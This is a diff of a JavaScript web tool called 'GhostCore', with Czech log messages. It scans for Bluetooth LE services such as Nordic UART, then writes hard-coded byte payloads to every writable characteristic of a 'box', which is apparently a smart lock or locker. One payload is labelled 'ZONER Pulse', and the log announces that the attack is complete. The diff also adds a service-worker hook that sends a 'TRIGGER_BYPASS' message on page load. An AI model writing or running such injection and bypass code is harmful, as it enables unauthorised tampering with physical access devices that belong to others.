@@ -51,14 +51,13 @@ const GhostCore = {
     async init() {
         this.log("SPOUŠTÍM HYBRIDNÍ SKEN...", "log-blue");
         try {
-            // INTEGRACE VŠECH UUID (Propustky z v4.1 i v5.0)
             const universalUUIDs = [
                 '0000ffe0-0000-1000-8000-00805f9b34fb', 
                 '0000ffe1-0000-1000-8000-00805f9b34fb',
                 '0000fff0-0000-1000-8000-00805f9b34fb',
                 '00001800-0000-1000-8000-00805f9b34fb',
                 '00001801-0000-1000-8000-00805f9b34fb',
-                '6e400001-b5a3-f393-e0a9-e50e24dcca9e', // Nordic UART (Zásadní pro boxy)
+                '6e400001-b5a3-f393-e0a9-e50e24dcca9e', 
                 '0000af30-0000-1000-8000-00805f9b34fb'
             ];
 
@@ -109,7 +108,7 @@ const GhostCore = {
         const payloads = [
             [0x55, 0x01, 0x01, 0x00, 0x57], 
             [0xA5, 0x00, 0x01, 0x01, 0x05], 
-            [0xFB, 0x61, 0x01, 0x00, 0x00, 0xBC], // ZONER Pulse (Klíčové!)
+            [0xFB, 0x61, 0x01, 0x00, 0x00, 0xBC], 
             [0x4f, 0x50, 0x45, 0x4e],       
             [0x06, 0x01, 0x01, 0x01, 0x02, 0x01, 0x0C]
         ];
@@ -124,13 +123,28 @@ const GhostCore = {
                         await char.writeValue(buffer);
                     }
                     this.log(`INJECT -> ${char.uuid.slice(4,8)} [OK]`);
-                    await this.sleep(250); // Stabilizační pauza
+                    await this.sleep(250);
                 } catch (e) { continue; }
             }
         }
         this.log("ÚTOK DOKONČEN. SLEDUJ ODPOVĚDI BOXU.", "log-blue");
     }
 };
+
+// --- MOSTEK PRO SERVICE WORKER & BYPASS ---
+if ('serviceWorker' in navigator) {
+    window.addEventListener('load', () => {
+        navigator.serviceWorker.register('sw.js').then(reg => {
+            console.log('GHOST_SW: AKTIVNÍ');
+            // Pokud je SW již aktivní, pošleme bypass hned
+            if (reg.active) reg.active.postMessage({type: 'TRIGGER_BYPASS'});
+        }).catch(err => console.log('SW_ERROR:', err));
+    });
+
+    navigator.serviceWorker.addEventListener('controllerchange', () => {
+        navigator.serviceWorker.controller.postMessage({type: 'TRIGGER_BYPASS'});
+    });
+}
 
 document.getElementById('scan-btn').onclick = () => GhostCore.init();
 document.getElementById('attack-btn').onclick = () => GhostCore.attack();
